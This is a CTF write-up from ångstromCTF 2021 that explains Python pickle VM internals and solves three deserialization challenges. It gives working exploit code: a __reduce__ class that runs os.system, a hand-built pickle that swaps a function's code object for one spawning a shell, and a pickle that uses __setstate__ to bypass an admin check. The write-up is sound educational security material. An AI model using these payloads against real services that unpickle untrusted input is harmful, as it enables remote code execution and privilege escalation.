---
title: ångstromCTF 2021 - Jar/Snake/Ekans
date: 2021-04-15
slug: /writeups/angstromctf-2021-pickle
excerpt: Exploiting heavily restricted pickle deserialization
author: Darin Mao
---

Jar, Snake, and Ekans were challenges about python pickles from ångstromCTF 2021. Jar was a pretty typical pickle challenge, but the latter two were not.

# Pickle Internals
The pickle module is a pretty special bit of code that allows you to serialize and deserialize many different python classes. However, what is not immediately obvious is *how* this is accomplished. Rather than storing data directly, pickles store a series of instructions that tell the pickle VM how to recreate that data. When a pickle is loaded, it is not just *deserialized*; rather, it is *executed* by the pickle VM. This makes pickles a *lot* more powerful than something like JSON or YAML.

If you want to see what instructions a pickle contains, you can use `pickletools.dis`. For example:
```
>>> import pickle, pickletools
>>> pickletools.dis(pickle.dumps([1, 2, 3, 4]))
    0: \x80 PROTO      4
    2: \x95 FRAME      13
   11: ]    EMPTY_LIST
   12: \x94 MEMOIZE    (as 0)
   13: (    MARK
   14: K        BININT1    1
   16: K        BININT1    2
   18: K        BININT1    3
   20: K        BININT1    4
   22: e        APPENDS    (MARK at 13)
   23: .    STOP
```

For more details on how pickle works, the source code for [pickle.py](https://github.com/python/cpython/blob/master/Lib/pickle.py) and [pickletools.py](https://github.com/python/cpython/blob/master/Lib/pickletools.py) is extremely helpful. Personally, I find pickle more useful because reading the source shows exactly what goes on when an opcode is executed, but pickletools has pretty in-depth documentation about each opcode. Since we're mostly interested in what goes on during a pickle *load*, I recommend searching through pickle for `load_opcode`, where `opcode` is the opcode you're interested in.

Note that, by default, the pickle module actually [calls a C implementation](https://github.com/python/cpython/blob/master/Lib/pickle.py#L1775-L1789) (you can read the source [here](https://github.com/python/cpython/blob/master/Modules/_pickle.c) if you like). However, for all intents and purposes, we can consider the python and C implementations functionally equivalent.

## Basics
Pickle is a stack-based VM, meaning that most of the data manipulation is done on a stack. However, there is also a second storage area called the `memo`, which is just a big dictionary with integer keys intended for saving values for use later. This is particularly helpful when deserializing many similar big objects, but we will not be using it very much.

Most opcodes will push something to the top of the stack. For example, `UNICODE` pushes a newline-terminated string from the pickle to the top of the stack, and `INT` pushes a newline-terminated string integer from the pickle to the top of the stack. There is also a special opcode, `PROTO`, which sets the protocol version of a pickle. Different protocols support different features, but they are generally backwards compatible, so it might be sensible to set the protocol to 4 or 5 at the beginning of your pickles.

There are far too many opcodes to go through all of them, so it is best to refer to the pickle source when necessary. That being said, there are a few special ones worth mentioning.

## MARK
The `MARK` opcode is special because it allows you to create more complex types like lists and dictionaries. What it does is push a special "markobject" onto the stack, and then later opcodes can pop up to the last markobject. In this way, pickles can create many different things, and also nest them as deep as python will allow!

Side note: while the `MARK` opcode *conceptually* pushes a special "markobject," this is not how it is implemented. It is helpful to *think* of it this way, but the pickle VM will actually just save the entire stack into another `metastack` (a stack of stacks), then put all future objects into an entirely new stack. Then, when an opcode pops until the mark, the pickle VM will restore the last saved stack from the `metastack` and return everything on the new stack.

Here's an example:

```
>>> obj = {'a': 1, 'b': 'string', 'c': [1, 2, (3, 4, 5, 6, 7), {'d': None}]}
>>> pickletools.dis(pickletools.optimize(pickle.dumps(obj)))
    0: \x80 PROTO      4
    2: \x95 FRAME      48
   11: }    EMPTY_DICT
   12: (    MARK
   13: \x8c     SHORT_BINUNICODE 'a'
   16: K        BININT1    1
   18: \x8c     SHORT_BINUNICODE 'b'
   21: \x8c     SHORT_BINUNICODE 'string'
   29: \x8c     SHORT_BINUNICODE 'c'
   32: ]        EMPTY_LIST
   33: (        MARK
   34: K            BININT1    1
   36: K            BININT1    2
   38: (            MARK
   39: K                BININT1    3
   41: K                BININT1    4
   43: K                BININT1    5
   45: K                BININT1    6
   47: K                BININT1    7
   49: t                TUPLE      (MARK at 38)
   50: }            EMPTY_DICT
   51: \x8c         SHORT_BINUNICODE 'd'
   54: N            NONE
   55: s            SETITEM
   56: e            APPENDS    (MARK at 33)
   57: u        SETITEMS   (MARK at 12)
   58: .    STOP
```

The use of `pickletools.optimize` here is irrelevant—all it does is remove all the `MEMOIZE` operations that pickle puts in by default, but the pickle remains functionally identical. As you can see, `MARK` allows pickles to nest data arbitrarily deeply!

## GLOBAL/STACK_GLOBAL
The `GLOBAL` and `STACK_GLOBAL` opcodes are how pickles can access the outside world. They take two arguments—`GLOBAL` uses newline-terminated strings and `STACK_GLOBAL` uses the two items on the top of the stack—and calls `find_class` on them. For example, `cMODULE\nNAME\n` would call `find_class('MODULE', 'NAME')`. The default implementation of `find_class` is below:

```python
def find_class(self, module, name):
  # Subclasses may override this.
  sys.audit('pickle.find_class', module, name)
  if self.proto < 3 and self.fix_imports:
    if (module, name) in _compat_pickle.NAME_MAPPING:
      module, name = _compat_pickle.NAME_MAPPING[(module, name)]
    elif module in _compat_pickle.IMPORT_MAPPING:
      module = _compat_pickle.IMPORT_MAPPING[module]
  __import__(module, level=0)
  if self.proto >= 4:
    return _getattribute(sys.modules[module], name)[0]
  else:
    return getattr(sys.modules[module], name)
```

`find_class` is essentially the *only* way that pickles can access anything beyond primitive like integers and lists. Everything we can access must come from here, and this is why restricted unpicklers will usually just implement this function. If the restricted `find_class` doesn't allow access to something, then there is no way for pickles to directly get it either.

## REDUCE
The `REDUCE` opcode is designed to allow classes to define a custom deserialization. The way the interface works is, classes can define a method called `__reduce__` or `__reduce_ex__` (they do slightly different things) that pickle will call when serializing them. Then, when the pickle is deserialized, it will call whatever function is specified.

Although the documentation specifies that `__reduce__` should return either a string or a tuple with very specific elements, all of it just boils down to a very simple opcode:

```python
def load_reduce(self):
  stack = self.stack
  args = stack.pop()
  func = stack[-1]
  stack[-1] = func(*args)
```

All this opcode does is pop a tuple of arguments off the stack, then call the top stack item as a function with those arguments. For our purposes, this is an important primitive—it allows us to call *any* function we can get access to.

## BUILD
The `BUILD` opcode is another interesting one.

```python
def load_build(self):
  stack = self.stack
  state = stack.pop()
  inst = stack[-1]
  setstate = getattr(inst, "__setstate__", None)
  if setstate is not None:
    setstate(state)
    return
  slotstate = None
  if isinstance(state, tuple) and len(state) == 2:
    state, slotstate = state
  if state:
    inst_dict = inst.__dict__
    intern = sys.intern
    for k, v in state.items():
      if type(k) is str:
        inst_dict[intern(k)] = v
      else:
        inst_dict[k] = v
  if slotstate:
    for k, v in slotstate.items():
      setattr(inst, k, v)
```

Take the time to read this one carefully, as it is *very* important. The `BUILD` opcode is extremely powerful, as it allows us to modify `__dict__` of or even call `setattr` on anything we can get access to.

## STOP
Finally, the `STOP` opcode does just that—it tells pickle to stop executing and return whatever is on the top of the stack. Note that pickletools will likely complain if the stack is not empty when `STOP` is reached, but the pickle module does not care. So, don't worry too much about popping things off the stack when you're done.

# Jar (web, 70 points)
> My other pickle challenges seem to be giving you all a hard time, so here's a [simpler one](https://jar.2021.chall.actf.co/) to get you warmed up.

Files:
- [jar.py](https://files.actf.co/fbb50c51e4eb57abfac63ea2000aad91a62b804d0e6be1d7b95ba369af0f1d1c/jar.py)
- [pickle.jpg](https://files.actf.co/6b46cfe44c6b29e8df0a6f917d50bdb15072d9d9f4879d789a8371d8d1a12a39/pickle.jpg)
- [Dockerfile](https://files.actf.co/477ec9a25c526332ea8d2c800ba9c31fcd885db991716a60761a4eb31f76ee7b/Dockerfile)

## Arbitrary Pickle Deserialization
In both endpoints, the server will load any pickle we give it.

```python
@app.route('/')
def jar():
  contents = request.cookies.get('contents')
  if contents: items = pickle.loads(base64.b64decode(contents))
  else: items = []
```

This is a classic challenge, and you can probably find a solution similar to the one below on the internet.

```python
import pickle
import base64
import os

class RCE:
  def __reduce__(self):
    return os.system, ('ls -la',) # or whatever command here

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

This gives us RCE, and we can easily get the flag with a reverse shell or similar. However, this solution is lame, and with our new knowledge of pickles, we can do much better. Notice that the flag is stored as a global variable that we have access to. We can try using `GLOBAL` to grab it.

```
>>> p = GLOBAL + b'__main__\nflag\n' + STOP
>>> pickle.loads(p)
'actf{FAKE_FLAG}'
```

This calls `find_class('__main__', 'flag')` as expected. However, the server expects a list, so we adjust accordingly.

```
>>> p = MARK + GLOBAL + b'__main__\nflag\n' + LIST + STOP
>>> pickle.loads(p)
['actf{FAKE_FLAG}']
```

If we base64 encode this and set it as our cookie, we'll get the flag.

## Flag
```
actf{you_got_yourself_out_of_a_pickle}
```

# Snake (misc, 240 points)
> Snake is such a fun game. Slithering around, eating pickles, slamming into walls... that's the life.

Files:
- [snake.py](https://files.actf.co/d2035a299728deb6b85ad347d8557b8e22035b41db59d4de555b7c822a3b85d4/snake.py)

## Restricted Pickle Deserialization
This challenge is much more difficult because it restricts what we can access through `find_class`.

```python
class SnakeRestrictedUnpickler(pickle.Unpickler):
  def find_class(self, module, name):
    if module == "__main__" and name.startswith("Snake") and name.count(".") <= 1 and len(name) <= len("SnakeSave.HighScores"):
      return super().find_class(module, name)
    raise pickle.UnpicklingError(f"HACKING DETECTED")
```

Basically, we are allowed to load anything in the `__main__` module that starts with `Snake`, has at most one period, and is no longer than twenty characters long. At first glance, this seems safe, but notice that the `SnakeWindow` function also matches these criteria. Furthermore, since we are allowed one period, we can access any attribute of `SnakeWindow`, as long as it is short enough.

## Code Objects
In python, functions are actually objects that contain a code object. This code object contains, among other things, the bytecode of that function and all the objects it references. And by *sheer conincidence*, `SnakeWindow.__code__` is *just* the right length to pass the restricted unpickler.

Unfortunately, we can't just directly overwrite the bytecode of this code object to get arbitrary bytecode execution—that would be far too easy.

```
>>> setattr(SnakeWindow.__code__, 'co_code', b'noodles')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: readonly attribute
```

However, if we could somehow make our own code object, then we *can* assign `SnakeWindow.__code__` to it, and then when the program later calls `SnakeWindow` we will have arbitrary bytecode execution. Unfortunately, there is no easy way to get access to the code object constructor. If we could find a way to call `type(SnakeWindow.__code__)`, then we would get the code object class, allowing us to construct a new code object.

## `__class__` Attribute
All python objects have a special attribute called `__class__` that is a reference to the type of the current instance. For example:

```
>>> ().__class__
<class 'tuple'>
>>> [].__class__
<class 'list'>
>>> (1).__class__
<class 'int'>
```

Unfortunately, the restricted unpickler does not allow us to directly access `SnakeWindow.__code__.__class__`, as that would require two periods. Additionally, `SnakeWindow.__class__` is too long.

But, what about `SnakeSave`? One might think that, since `SnakeSave` is a class rather than an instance, that `__class__` is not defined at all. However, in python, classes are also objects themselves, instances of `type`!

```
>>> SnakeSave.__class__
<class 'type'>
```

This allows us to call `type(SnakeWindow.__code__)`, just like we wanted!

```
>>> SnakeSave.__class__(SnakeWindow.__code__)
<class 'code'>
```

Now that we have access to the code object constructor, all we need to do is call it with the right arguments (with `REDUCE`), then assign it to `SnakeWindow.__code__` (with `BUILD`).

## Building the Pickle
Note that `SnakeWindow` is called with one argument. So, we'll create a function that takes one argument (the `reset` is to fix the terminal, since the function is called by ncurses). Then, we'll print out all the necessary arguments to the code object constructor.

```python
def lmao(xd):
  __import__('os').system('reset;sh')

print(lmao.__code__.co_argcount)
print(lmao.__code__.co_posonlyargcount)
print(lmao.__code__.co_kwonlyargcount)
print(lmao.__code__.co_nlocals)
print(lmao.__code__.co_stacksize)
print(lmao.__code__.co_flags)
print(lmao.__code__.co_code)
print(lmao.__code__.co_consts)
print(lmao.__code__.co_names)
print(lmao.__code__.co_varnames)
print(lmao.__code__.co_filename)
print(lmao.__code__.co_name)
print(lmao.__code__.co_firstlineno)
print(lmao.__code__.co_lnotab)
print(lmao.__code__.co_freevars)
print(lmao.__code__.co_cellvars)
```

Now, we'll create a pickle to get the code object constructor and call it with these arguments, then assign it to `SnakeWindow.__code__`.

```python
p = PROTO + b'\x04' + \
  GLOBAL + b'__main__\nSnakeWindow\n' + \
  NONE + \
  MARK + \
    UNICODE + b'__code__\n' + \
    GLOBAL + b'__main__\nSnakeSave.__class__\n' + \
      GLOBAL + b'__main__\nSnakeWindow.__code__\n' + \
    TUPLE1 + REDUCE + \
    MARK + \
      BININT1 + b'\x01' + \
      BININT1 + b'\x00' + \
      BININT1 + b'\x00' + \
      BININT1 + b'\x01' + \
      BININT1 + b'\x03' + \
      BININT1 + b'\x43' + \
      SHORT_BINBYTES + b'\x12' + b't\x00d\x01\x83\x01\xa0\x01d\x02\xa1\x01\x01\x00d\x00S\x00' + \
      NONE + UNICODE + b'os\n' + UNICODE + b'reset;sh\n' + TUPLE3 + \
      UNICODE + b'__import__\n' + UNICODE + b'system\n' + TUPLE2 + \
      UNICODE + b'xd\n' + TUPLE1 + \
      UNICODE + b'solve.py\n' + \
      UNICODE + b'lmao\n' + \
      BININT1 + b'\x03' + \
      SHORT_BINBYTES + b'\x02' + b'\x00\x01' + \
      EMPTY_TUPLE + \
      EMPTY_TUPLE + \
      TUPLE + \
    REDUCE + \
    DICT + \
  TUPLE2 + \
  BUILD + \
  STOP
```

We're writing the pickle by hand because it ~~builds character~~ gives us much greater control than simply using `pickle.dump`. Starting from the inside out, this pickle constructs a code object with the necessary arguments, creates a dictionary `{'__code__': code_obj}`, creates a tuple `(None, code_dict)`, and finally uses `BUILD` on `SnakeWindow` to eventually call `setattr(SnakeWindow, '__code__', code_obj)`. If you don't understand this fully, I highly recommend following `pickletools.dis` and stepping through it one instruction at a time.

Sure enough, unpickling this and then calling `SnakeWindow` results in a shell. However, since the result of our pickle is not a `SnakeSave` like the game expects, trying to access `highScores` will fail. This is not a problem, though, because overwriting the code object of `SnakeWindow` is already done at this point, so we can just remove the `STOP` and append a regular `SnakeSave` pickle at the end! Rather than try to generate this ourselves, we can just play a game.

```python
import base64
save = base64.b64decode('gASVdwAAAAAAAACMCF9fbWFpbl9flIwJU25ha2VTYXZllJOUKYGUfZQojApoaWdoU2NvcmVzlGgAjBRTbmFrZVNhdmUuSGlnaFNjb3Jlc5STlCmBlH2UKIwGcGxheWVylIwDa2ZilIwGc2NvcmVzlF2USwJhdWKMBGdhbWWUTnViLg==')
print(base64.b64encode(p + save).decode())
```

Inputting this save code results in a shell.

## Flag
```
actf{pickles_are_just_cucumbers_with_extra_steps}
```

# Ekans (web, 250 points)
> I built myself a pokédex to keep track of all the cool pokémon I catch. There's this secret pokémon I don't want anyone to know about, so I used a SafeUnpickler and now nobody can see it! Try it for yourself: [ekans.2021.chall.actf.co](https://ekans.2021.chall.actf.co/)

Files:
- [ekans.py](https://files.actf.co/4da7a3c2c257787315a78cae55564b9eef0c77751c2114a20bfbec524f7d934b/ekans.py)
- [db.py](https://files.actf.co/b2e96e1d40ea3b565ab1341f111fc00dc7652bd34a09bac9d6d8b8d273a614ae/db.py)
- [Dockerfile](https://files.actf.co/cbcf342322bf1082157e526327aaf6dc19dd22305188b391038f962a32c82b98/Dockerfile)

## Restricted Pickle Deserialization
The restrictions in this challenge are much more strict than the last one.

```python
class SafeUnpickler(pickle.Unpickler):
  def find_class(self, module, name):
    if module == "db" and name == "User": return User
    raise pickle.UnpicklingError(f"HACKING DETECTED")
```

Basically, we can *only* access `db.User` and nothing else. In addition, web server is quite peculiar:

```python
@app.route('/', methods=['GET', 'POST'])
def pokedex():
  db = importlib.util.find_spec('db').loader.load_module('db')

  if request.method == "POST":
    # make a new user and return

  if 'user' not in request.cookies:
    # send login page and return

  if db.load_user(request).is_admin():
    # send admin panel (no flag) and return

  if not db.load_user(request).authenticated():
    # send invalid credentials page

  # send pokedex page, hiding the flag if not db.load_user(request).is_admin()
```

We need to send a pickle such that `is_admin` returns `False` the first time but `True` the next time. While this may seem impossible, note that the route handler loads a fresh instance of `db` on every request, so we can potentially overwrite class attributes on `db.User` which could lead to some interesting behavior. If this were not the case, then competitors would interfere with each other, so we could rule out the possibility.

## A Closer Look at BUILD
Look, again, at the beginning of the source code for `load_build`:

```python
def load_build(self):
  stack = self.stack
  state = stack.pop()
  inst = stack[-1]
  setstate = getattr(inst, "__setstate__", None)
  if setstate is not None:
    setstate(state)
    return
```

Notice that if `inst` has a `__setstate__` attribute, the build opcode will call that function instead. Most importantly, in this case, the build opcode will *not* continue to write to `__dict__` or call `setattr`. This could lead to different behavior the next time it is invoked.

With this, we can form a plan. Our pickle should have the necessary attributes to make `is_admin` return `True`, use `BUILD` to set the necessary attributes to make `is_admin` return `False`, and finally use `BUILD` to set `__setstate__` on the `db.User` class to any callable. On the next deserialization, the `BUILD` to make `is_admin` return `False` will do nothing, and our deserialized user will be an admin, allowing us to get the flag.

## Building the Pickle
Once again, we will write our pickle manually. We have to be somewhat clever about how we execute our plan, because once `__setstate__` is set, then `BUILD` will never work again. The solution is to set `admin` to `True` on the `db.Admin` *class* rather than an instance, so that all users are admins by default. Then, we can construct new users by using `REDUCE` on the constructor instead of using `BUILD`.

```python
p = PROTO + b'\x04' + \
  GLOBAL + b'db\nUser\n' + \
  NONE + \
  MARK + \
    UNICODE + b'admin\n' + \
    NEWTRUE + \
    DICT + \
  TUPLE2 + BUILD + \
  EMPTY_TUPLE + REDUCE + \
  MARK + \
    UNICODE + b'admin\n' + \
    NEWFALSE + \
    DICT + \
  BUILD + \
  GLOBAL + b'db\nUser\n' + \
  NONE + \
  MARK + \
    UNICODE + b'__setstate__\n' + \
    GLOBAL + b'db\nUser\n' + \
    DICT + \
  TUPLE2 + BUILD + \
  POP + \
  STOP
```

This pickle first uses `BUILD` to set `admin` to `True` on the `db.User` class, then uses `REDUCE` to construct a new user object. Then, it uses `BUILD` again to set `admin` to `False` on the newly constructed user object. Lastly, it uses `BUILD` one last time to set `__setstate__` to `db.User` on the `db.User` class. As with the last challenge, if you don't understand this fully, I highly recommend following `pickletools.dis` and stepping through it one instruction at a time.

Encoding this pickle with base64 and setting it as our cookie gives the Pokédex page containing the flag.

## Flag
```
actf{what?_ekans_is_evolving..._into_3K4N5!}
```

# Final Thoughts
Snake and Ekans were certainly very interesting challenges. I learned a lot about pickles, and also got a couple ideas for some potential future challenges 👀 Am I going to need to understand pickle internals for any real project? No, probably not. But that's part of the fun, isn't it?

Huge thanks to kmh for the great challenges 🙂
